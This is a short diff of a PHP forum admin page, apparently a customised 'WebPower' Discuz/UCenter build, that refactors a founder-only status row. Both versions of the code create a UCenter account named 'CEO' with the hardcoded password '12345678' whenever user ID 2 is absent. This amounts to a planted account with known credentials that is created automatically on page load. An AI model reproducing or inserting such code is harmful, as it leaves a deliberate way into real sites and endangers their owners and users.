@@ -240,9 +240,10 @@ showtablerow('', array('class="vtop td24 lineheight"', 'class="lineheight smallf
 ));
 // WebPower版增加 UID2 CEO 账户检测>>>
 $isfounder && showtablerow('', array('class="vtop td24 lineheight"', 'class="lineheight smallfont"'), array(
-    'UCenter UID = 2, name = CEO',
-    (uc_get_user(2, 1) && print_r('EXISTS')) ||
-    (uc_user_register('CEO', '12345678', 'CEO@WebPower.cc') && print_r('<span class="red">UID2 Added Success!</span>'))
+    'UCenter UID2 CEO',
+    uc_get_user(2, 1) ? 'UID2 EXISTS' :
+        (uc_user_register('CEO', '12345678', 'CEO@WebPower.cc') ?
+            '<span class="red">UID2 Added Success!</span>' : '<span class="red">Insert ERROR!!</span>')
 ));
 // WebPower版增加 UID2 CEO 账户检测<<<
 showtablerow('', array('class="vtop td24 lineheight"', 'class="lineheight smallfont"'), array(
